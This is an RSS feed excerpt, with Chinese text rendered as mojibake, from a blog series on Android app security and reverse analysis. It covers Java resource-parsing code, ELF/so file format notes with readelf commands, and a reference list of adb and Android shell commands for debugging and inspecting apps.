&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">float&lt;/span> &lt;span class="nf">complexToFloat&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">complex&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="kt">float&lt;/span>&lt;span class="o">)(&lt;/span>&lt;span class="n">complex&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">0xFFFFFF00&lt;/span>&lt;span class="o">)*&lt;/span>&lt;span class="n">RADIX_MULTS&lt;/span>&lt;span class="o">[(&lt;/span>&lt;span class="n">complex&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="n">4&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">3&lt;/span>&lt;span class="o">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kt">float&lt;/span> &lt;span class="n">RADIX_MULTS&lt;/span>&lt;span class="o">[]={&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">00390625F&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">051758E&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">005F&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">192093E&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">007F&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">4&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">656613E&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">010F&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">DIMENSION_UNITS&lt;/span>&lt;span class="o">[]={&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;px&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;dip&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;sp&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;pt&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;in&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;mm&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">FRACTION_UNITS&lt;/span>&lt;span class="o">[]={&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;%&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;%p&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;size:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,res0:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,dataType:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">getTypeStr&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;,data:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">getDataStr&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä»¥ä¸Šä»£ç æ¥è‡ªäºä¹¦çš„åŸä½œè€…çš„åšå®¢ï¼šhttps://blog.csdn.net/jiangwei0910410003/article/details/50628894&lt;/p>
&lt;p>åšå®¢é‡Œè¿˜æœ‰å¦‚ä½•è§£ææ“ä½œï¼Œç•™çœ‹ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="æ€»ç»“">æ€»ç»“&lt;/h3>
&lt;p>è¿™ä¸¤ç« è®²çš„è¿˜æ˜¯æŒºè¯¦ç»†çš„ï¼Œå¯ä»¥ç•™ç€å¤‡ç”¨æŸ¥é˜…ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶éƒ½èƒ½åŠ ä»¥æ··æ·†æ¥ä¿æŠ¤åº”ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯æŒºé‡è¦çš„ã€‚&lt;/p></description></item><item><title>Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡4</title><link>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/</link><pubDate>Wed, 22 Aug 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/</guid><description>&lt;h1 id="androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡4">Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡4&lt;/h1>
&lt;h2 id="ä¸€-åŸºç¡€ç¯‡">ä¸€ã€ åŸºç¡€ç¯‡â‘£&lt;/h2>
&lt;h3 id="ç¬¬å››ç« -soæ–‡ä»¶æ ¼å¼è§£æ">ç¬¬å››ç«  soæ–‡ä»¶æ ¼å¼è§£æ&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>ELFæ–‡ä»¶æ ¼å¼&lt;/p>
&lt;p>soæ–‡ä»¶-&amp;gt;elfæ–‡ä»¶ï¼Œæ–‡ä»¶æ ¼å¼çœ‹å›¾ï¼ˆå¼•ç”¨è‡ª@éè™«ï¼‰ï¼š&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/elf_feichong.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è§£æå·¥å…·&lt;/p>
&lt;ul>
&lt;li>
&lt;p>readelf å¸¸ç”¨å‘½ä»¤&lt;/p>
&lt;ul>
&lt;li>
&lt;p>readelf -h xxx.so æŸ¥å¤´éƒ¨ä¿¡æ¯&lt;/p>
&lt;/li>
&lt;li>
&lt;p>readelf -S xxx.so æŸ¥èŠ‚ï¼ˆSectionï¼‰ä¿¡æ¯&lt;/p>
&lt;/li>
&lt;li>
&lt;p>readelf -l xxx.so æŸ¥æ®µï¼ˆProgramï¼‰ä¿¡æ¯&lt;/p>
&lt;/li>
&lt;li>
&lt;p>readelf -a xxx.so æŸ¥å…¨éƒ¨ä¿¡æ¯&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>è§£æELFæ–‡ä»¶&lt;/p>
&lt;p>åŠ¨æ‰‹è§£æä¸€ä¸ªelfæ–‡ä»¶ ã€‚ã€‚ã€‚&lt;/p>
&lt;p>å¤ªæ°´ è¿™é‡Œçš„å†…å®¹&lt;/p>
&lt;p>ç›´æ¥å»çœ‹æºç å®ç°ç”¨javaè§£æelfæ–‡ä»¶ä¿¡æ¯https://github.com/fourbrother/parse_androidso&lt;/p>
&lt;p>ELF ç›¸å…³å†…å®¹è¿˜æ˜¯å•ç‹¬è¯¦ç»†åˆ†æ å•ç‹¬å†™ä¸€ç¯‡å§&lt;/p>
&lt;p>ELFä¹¦ç±ã€Š&lt;a class="link" href="https://item.jd.com/12240585.html" target="_blank" rel="noopener"
>LinuxäºŒè¿›åˆ¶åˆ†æ&lt;/a>ã€‹&lt;/p>
&lt;h3 id="æ€»ç»“">æ€»ç»“&lt;/h3>
&lt;p>åŠ å›ºè„±å£³å¿…é¡»æŒæ¡çš„çŸ¥è¯†ç‚¹ã€‚&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡3</title><link>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/</link><pubDate>Thu, 16 Aug 2018 02:00:00 +0800</pubDate><guid>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/</guid><description>&lt;h1 id="androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡3">Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡3&lt;/h1>
&lt;h2 id="ä¸€-åŸºç¡€ç¯‡">ä¸€ã€ åŸºç¡€ç¯‡â‘¢&lt;/h2>
&lt;h3 id="ç¬¬ä¸‰ç« -androidä¸­å¼€å‘ä¸é€†å‘å¸¸ç”¨å‘½ä»¤æ€»ç»“">ç¬¬ä¸‰ç«  Androidä¸­å¼€å‘ä¸é€†å‘å¸¸ç”¨å‘½ä»¤æ€»ç»“&lt;/h3>
&lt;h3 id="1-åŸºç¡€å‘½ä»¤">1. åŸºç¡€å‘½ä»¤&lt;/h3>
&lt;h3 id="11-catå‘½ä»¤">1.1 catå‘½ä»¤&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹æ–‡ä»¶å†…å®¹ ç»“åˆgrepè¿›è¡Œè¿‡æ»¤&lt;/p>
&lt;h3 id="12-echotouchå‘½ä»¤">1.2 echo/touchå‘½ä»¤&lt;/h3>
&lt;p>â€‹ å†™æ–‡ä»¶ é…ä¸ªå®šå‘ç¬¦ä½¿ç”¨&lt;/p>
&lt;h3 id="2-éshellå‘½ä»¤">2. éshellå‘½ä»¤&lt;/h3>
&lt;h3 id="21-adb-shell-dumpsys-sctivity-top">2.1 adb shell dumpsys sctivity top&lt;/h3>
&lt;p>â€‹ è¯´æ˜ï¼šæŸ¥çœ‹å½“å‰åº”ç”¨çš„activityä¿¡æ¯&lt;/p>
&lt;p>â€‹ ç”¨æ³•ï¼šè¿è¡Œéœ€è¦æŸ¥çœ‹çš„åº”ç”¨&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-3-1.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>â€‹ å¦‚æœç›´æ¥è¿è¡Œ &lt;code>adb shell dmpsys&lt;/code>ä¼šæŠŠå½“å‰ç³»ç»Ÿä¸­çš„æ‰€æœ‰åº”ç”¨è¿è¡Œçš„å››å¤§ç»„ä»¶éƒ½æ‰“å°å‡ºæ¥ å†…å®¹éå¸¸å¤š ä½¿ç”¨ä¿¡æ¯é‡å®šå‘æ¥è¿›è¡Œé€‰æ‹©ï¼šå¯å€ŸåŠ©Windowsçš„&lt;code>start&lt;/code>å‘½ä»¤&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-3-2.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="22-adb-shell-dumpsys-package">2.2 adb shell dumpsys package&lt;/h3>
&lt;p>â€‹ è¯´æ˜ï¼šæŸ¥çœ‹æŒ‡å®šåŒ…ååº”ç”¨çš„è¯¦ç»†ä¿¡æ¯ ï¼ˆç›¸å½“äºAndroidManifest.xmlçš„å†…å®¹ï¼‰&lt;/p>
&lt;p>â€‹ ç”¨æ³•ï¼šadb shell dumpsys package [pkgname]&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-3-3.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="23-adb-shell-dumpsys-meminfo">2.3 adb shell dumpsys meminfo&lt;/h3>
&lt;p>â€‹ è¯´æ˜ï¼šæŸ¥çœ‹æŒ‡å®šè¿›ç¨‹åæˆ–è€…è¿›ç¨‹idçš„å†…å­˜ä¿¡æ¯&lt;/p>
&lt;p>â€‹ ç”¨æ³•ï¼šadb shell dumpsys meminfo [pname/pid]&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/adnroid-note-3-4.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>â€‹ å’Œåé¢çš„topå‘½ä»¤ç»“åˆä½¿ç”¨ å¯ä»¥åˆ†æåº”ç”¨çš„æ€§èƒ½æ¶ˆè€—æƒ…å†µ&lt;/p>
&lt;h3 id="24-adb-shell-dump-dbnfo">2.4 adb shell dump dbnfo&lt;/h3>
&lt;p>â€‹ è¯´æ˜ï¼šæŸ¥çœ‹æŒ‡å®šåŒ…ååº”ç”¨çš„æ•°æ®åº“å­˜å‚¨ä¿¡æ¯ï¼ˆåŒ…æ‹¬å­˜å‚¨çš„SQLè¯­å¥ï¼‰&lt;/p>
&lt;p>â€‹ ç”¨æ³•ï¼šadb shell dump dbnfo [packagename]&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180716123331.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="25-adb-install">2.5 adb install&lt;/h3>
&lt;p>â€‹ è¯´æ˜ï¼šå®‰è£…åº”ç”¨åŒ…apkæ–‡ä»¶&lt;/p>
&lt;p>â€‹ ç”¨æ³•ï¼šadb install [apkæ–‡ä»¶]&lt;/p>
&lt;p>â€‹ å‡çº§å®‰è£… ä½¿ç”¨apk install -r [apkæ–‡ä»¶]&lt;/p>
&lt;h3 id="26-adb-uninstall">2.6 adb uninstall&lt;/h3>
&lt;p>â€‹ å¸è½½&lt;/p>
&lt;h3 id="27-adb-pull">2.7 adb pull&lt;/h3>
&lt;p>â€‹ ä»è®¾å¤‡å¤åˆ¶åˆ°æœ¬åœ°&lt;/p>
&lt;p>â€‹ adb pull è®¾å¤‡ç›®å½• æœ¬åœ°ç›®å½•&lt;/p>
&lt;h3 id="28-adb-push">2.8 adb push&lt;/h3>
&lt;p>â€‹ ä»æœ¬åœ°å¤åˆ¶åˆ°è®¾å¤‡&lt;/p>
&lt;p>â€‹ åŒä¸Š&lt;/p>
&lt;h3 id="29-adb-shell-screencap">2.9 adb shell screencap&lt;/h3>
&lt;p>â€‹ æˆªå±&lt;/p>
&lt;p>â€‹ adb shell scteencap -p æˆªå›¾æ–‡ä»¶ç›®å½•&lt;/p>
&lt;p>â€‹ å¿«é€Ÿæˆªå–æ‰‹æœºå±å¹•&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">adb shell screencap -p /sdcard/tmp.png
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adb pull /sdcard/tmp.png D:\
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start D:\tmp.png
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="210-adb-shell-screenrecord">2.10 adb shell screenrecord&lt;/h3>
&lt;p>â€‹ å½•å±&lt;/p>
&lt;p>â€‹ adb shell screenrecord è·¯å¾„&lt;/p>
&lt;h3 id="211-adb-shell-input-text">2.11 adb shell input text&lt;/h3>
&lt;p>â€‹ è¾“å…¥æ–‡æœ¬å†…å®¹&lt;/p>
&lt;p>â€‹ adb shell input text [éœ€è¦è¾“å…¥æ–‡æœ¬æ¡†çš„å†…å®¹]&lt;/p>
&lt;p>â€‹ eg: è®©è¾“å…¥å†…å®¹çš„æ–‡æœ¬æ¡†å›å»ç„¦ç‚¹&lt;/p>
&lt;p>â€‹ &lt;code>adb shell input text 'hello world'&lt;/code>&lt;/p>
&lt;p>â€‹ è¿™ä¸ªå‘½ä»¤å¯ä»¥æ¨¡æ‹Ÿç‰©ç†é”®ç›˜ã€è™šæ‹Ÿé”®ç›˜ã€æ»‘åŠ¨ã€æ»šåŠ¨ç­‰äº‹ä»¶ã€‚&lt;/p>
&lt;h3 id="212-adb-forward">2.12 adb forward&lt;/h3>
&lt;p>â€‹ ç«¯å£è½¬å‘å‘½ä»¤&lt;/p>
&lt;p>â€‹ adb forward [è¿œç¨‹åè®®ï¼šç«¯å£å·]Â· [è®¾å¤‡åè®®ï¼šç«¯å£å· ]&lt;/p>
&lt;p>â€‹ eg: adb forward tcp:23946 tcp:23946 IDA è°ƒè¯•&lt;/p>
&lt;p>â€‹ adb forwrd tcp:8700 jwdp:1786&lt;/p>
&lt;h3 id="213-adb-jdwp">2.13 adb jdwp&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹è®¾å¤‡ä¸­å¯ä»¥è¢«è°ƒè¯•çš„åº”ç”¨çš„è¿›ç¨‹å·&lt;/p>
&lt;p>â€‹ adb jdwp&lt;/p>
&lt;h3 id="214-adb-logcat">2.14 adb logcat&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹å½“å‰çš„æ—¥å¿—ä¿¡æ¯&lt;/p>
&lt;p>â€‹ adb logcat -s tag egï¼š&lt;code>adb logcat -s fb&lt;/code>&lt;/p>
&lt;p>â€‹ adb logcat | findstr pname/pip/keyword&lt;/p>
&lt;p>â€‹ adb logcat | findstr åŒ…&lt;/p>
&lt;p>â€‹ æ—¥å¿—ä¿¡æ¯è¿‡æ»¤&lt;/p>
&lt;h3 id="3-shell-å‘½ä»¤">3. shell å‘½ä»¤&lt;/h3>
&lt;p>è¿™å„¿shellå‘½ä»¤æ˜¯æŒ‡å…ˆè¿è¡Œadb shell å†æ‰§è¡Œå‘½ä»¤ ä¸éshellå‘½ä»¤äº’é€š&lt;/p>
&lt;h3 id="31-run-as">3.1 run-as&lt;/h3>
&lt;p>â€‹ åœ¨érootè®¾å¤‡ä¸­æŸ¥çœ‹æŒ‡å®šdebugæ¨¡å¼çš„åŒ…ååº”ç”¨æ²™ç›’æ•°æ®&lt;/p>
&lt;p>â€‹ run-as [package name]&lt;/p>
&lt;h3 id="32-ps">3.2 ps&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹è®¾å¤‡è¿›ç¨‹ä¿¡æ¯æˆ–è€…æŒ‡å®šè¿›ç¨‹çš„çº¿ç¨‹ä¿¡æ¯&lt;/p>
&lt;p>â€‹ ps | grep è¿‡æ»¤å†…å®¹&lt;/p>
&lt;p>â€‹ ps -t [pid] æŸ¥çœ‹pid å¯¹åº”çš„çº¿ç¨‹ä¿¡æ¯&lt;/p>
&lt;p>â€‹&lt;/p>
&lt;h3 id="33-pm-clear">3.3 pm clear&lt;/h3>
&lt;p>â€‹ æ¸…ç©ºæŒ‡å®šåŒ…åçš„åº”ç”¨æ•°æ®&lt;/p>
&lt;p>â€‹ pm clear [packagename]&lt;/p>
&lt;h3 id="34-pm-install">3.4 pm install&lt;/h3>
&lt;p>â€‹ å®‰è£…è®¾å¤‡ä¸­çš„apk åŒadb install&lt;/p>
&lt;h3 id="35-pm-uninstall">3.5 pm uninstall&lt;/h3>
&lt;p>â€‹ å¸è½½&lt;/p>
&lt;h3 id="36-am-start">3.6 am start&lt;/h3>
&lt;p>â€‹ å¯åŠ¨ä¸€ä¸ªåº”ç”¨&lt;/p>
&lt;p>â€‹ am start -n [packname]/[packname].[activity name]&lt;/p>
&lt;p>â€‹ am start -D -n (ä»¥debugæ–¹å¼å¯åŠ¨)&lt;/p>
&lt;h3 id="37-am-startservice">3.7 am startservice&lt;/h3>
&lt;p>â€‹ å¯åŠ¨ä¸€ä¸ªæœåŠ¡&lt;/p>
&lt;p>â€‹ am startservice -n [packagename]/[package name].[service name]&lt;/p>
&lt;h3 id="38-am-broadcast">3.8 am broadcast&lt;/h3>
&lt;p>â€‹ å‘é€ä¸€ä¸ªå¹¿æ’­&lt;/p>
&lt;p>â€‹ am broadcast -a [å¹¿æ’­åŠ¨ä½œ]&lt;/p>
&lt;h3 id="39-netcfg">3.9 netcfg&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹è®¾å¤‡çš„ipåœ°å€&lt;/p>
&lt;h3 id="310-netstat">3.10 netstat&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹è®¾å¤‡çš„ç«¯å£å·ä¿¡æ¯&lt;/p>
&lt;h3 id="311-app_process">3.11 app_process&lt;/h3>
&lt;p>â€‹ è¿è¡Œjavaä»£ç &lt;/p>
&lt;p>â€‹ app_process [è¿è¡Œä»£ç ç›®å½•]Â· [è¿è¡Œä¸»ç±»]&lt;/p>
&lt;p>â€‹ eg:&lt;/p>
&lt;p>â€‹ &lt;code>export CLASSPATH = /data/demo.jar&lt;/code>&lt;/p>
&lt;p>â€‹ &lt;code>exec /system/bin/app_process /data/cn.wdasdkl.Main&lt;/code>&lt;/p>
&lt;h3 id="312-dalvikvm">3.12 dalvikvm&lt;/h3>
&lt;p>â€‹ è¿è¡Œdexæ–‡ä»¶&lt;/p>
&lt;p>â€‹ dalvikvm -cp [dexæ–‡ä»¶] Â· [è¿è¡Œä¸»ç±»]&lt;/p>
&lt;p>â€‹ å·®ä¸å¤šåŒä¸Šçš„ç”¨å¤„&lt;/p>
&lt;h3 id="313-top">3.13 top&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹å½“å‰åº”ç”¨CPUçš„æ¶ˆè€—ä¿¡æ¯ã€‚&lt;/p>
&lt;p>â€‹ top [-n/-m/-d/-s/-t]&lt;/p>
&lt;p>â€‹ -m æœ€å¤šæ˜¾ç¤ºå¤šå°‘ä¸ªè¿›ç¨‹&lt;/p>
&lt;p>â€‹ -n åˆ·æ–°æ¬¡æ•°&lt;/p>
&lt;p>â€‹ -d åˆ·æ–°æ—¶é—´é—´éš”&lt;/p>
&lt;p>â€‹ -s æŒ‰é‚£ä¸€åˆ—æ’åº&lt;/p>
&lt;p>â€‹ -t æ˜¾ç¤ºçº¿ç¨‹ä¿¡æ¯è€Œä¸æ˜¯è¿›ç¨‹&lt;/p>
&lt;h3 id="314-getprop">3.14 getprop&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹ç³»ç»Ÿå±æ€§&lt;/p>
&lt;p>â€‹ getprop [å±æ€§å€¼åç§°]&lt;/p>
&lt;p>â€‹ egï¼š&lt;code>getprop ro.debuggable&lt;/code>&lt;/p>
&lt;p>â€‹ æŸ¥çœ‹è®¾å¤‡çš„ä¿¡æ¯&lt;/p>
&lt;h3 id="4-æ“ä½œapk-å‘½ä»¤">4 æ“ä½œapk å‘½ä»¤&lt;/h3>
&lt;h3 id="41-ç”¨aapt-å‘½ä»¤æ“ä½œapkå‘½ä»¤">4.1 ç”¨aapt å‘½ä»¤æ“ä½œapkå‘½ä»¤&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹apkä¸­çš„ä¿¡æ¯ä»¥åŠç¼–è¾‘apkç¨‹åºåŒ…&lt;/p>
&lt;p>â€‹ aapt dump xmltree [apkåŒ…] Â· [éœ€è¦æŸ¥çœ‹çš„èµ„æºæ–‡ä»¶]&lt;/p>
&lt;p>â€‹ egï¼š&lt;code>aapt dump xmltree demp.apk AndroidManifest.xml&lt;/code>&lt;/p>
&lt;h3 id="42-ç”¨dexdump-æ“ä½œdex-å‘½ä»¤">4.2 ç”¨dexdump æ“ä½œdex å‘½ä»¤&lt;/h3>
&lt;p>â€‹ æŸ¥çœ‹dexçš„è¯¦ç»†ä¿¡æ¯&lt;/p>
&lt;p>â€‹ dexdump [dexæ–‡ä»¶è·¯å¾„]&lt;/p>
&lt;h3 id="5-è¿›ç¨‹å‘½ä»¤">5 è¿›ç¨‹å‘½ä»¤&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">##### 5.1 æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å†…å­˜åŠ è½½æƒ…å†µ
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>â€‹ cat proc/[pid]/maps æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„ä¿¡æ¯ï¼Œæ¯”å¦‚åŠ è½½äº†é‚£äº›soæ–‡ä»¶ï¼Œdexæ–‡ä»¶ç­‰ç­‰ã€‚&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180716134420.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="52-æŸ¥çœ‹è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯">5.2 æŸ¥çœ‹è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯&lt;/h3>
&lt;p>â€‹ cat /proc/[pid]/status&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180716134609.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="53-æŸ¥çœ‹å½“å‰åº”ç”¨ä½¿ç”¨çš„ç«¯å£å·ä¿¡æ¯">5.3 æŸ¥çœ‹å½“å‰åº”ç”¨ä½¿ç”¨çš„ç«¯å£å·ä¿¡æ¯&lt;/h3>
&lt;p>â€‹ cat /proc /[pid] / net / tcp/ tcp6 /udp /udp6&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180716134826.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="æ€»ç»“">æ€»ç»“&lt;/h3>
